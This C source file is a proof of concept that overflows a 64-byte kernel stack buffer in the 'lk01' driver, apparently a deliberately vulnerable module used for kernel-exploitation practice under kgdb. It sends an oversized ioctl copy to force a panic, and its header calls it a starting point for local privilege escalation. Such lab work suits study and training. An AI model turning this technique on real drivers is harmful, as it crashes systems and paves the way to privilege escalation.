/*
 * lk01_expl — crash-triggering PoC for the lk01 driver's LK01_COPY stack overflow.
 *
 * This is a starting point for a real exploit, NOT a working LPE: it demonstrates the crash
 * (an unchecked copy_from_user smashing a 64-byte kernel stack buffer) and stops there. Build it
 * for the guest arch (see README.md for the cross-compile one-liner) and run it with
 * `start_kgdb --run ./exploit/lk01_expl` against a live session with lk01 loaded
 * (`start_kgdb --insmod ./modules/lk01`).
 */

#include <fcntl.h>
#include <linux/ioctl.h> /* UAPI-safe: provides the _IOW() macro for userspace */
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

/* Must mirror the kernel-side struct lk01_arg in lk01.c exactly. */
struct lk01_arg {
	size_t len;
	void *ptr;
};

#define LK01_COPY _IOW('L', 1, struct lk01_arg)

int main(void)
{
	const size_t len = 4096; /* kernel's kbuf[] is only 64 bytes — this overflows it */
	int fd;
	char *buf;
	struct lk01_arg arg;

	printf("[*] opening /dev/lk01\n");
	fd = open("/dev/lk01", O_RDWR);
	if (fd < 0) {
		perror("[!] open");
		return 1;
	}

	buf = malloc(len);
	if (!buf) {
		perror("[!] malloc");
		close(fd);
		return 1;
	}
	memset(buf, 0x41, len);

	arg.len = len;
	arg.ptr = buf;

	printf("[*] ioctl(LK01_COPY, len=%zu) — overflowing the 64-byte kernel stack buffer\n", len);
	printf("[*] expecting a kernel panic; if you read this, it didn't crash\n");
	if (ioctl(fd, LK01_COPY, &arg) < 0)
		perror("[!] ioctl");

	free(buf);
	close(fd);
	return 0;
}
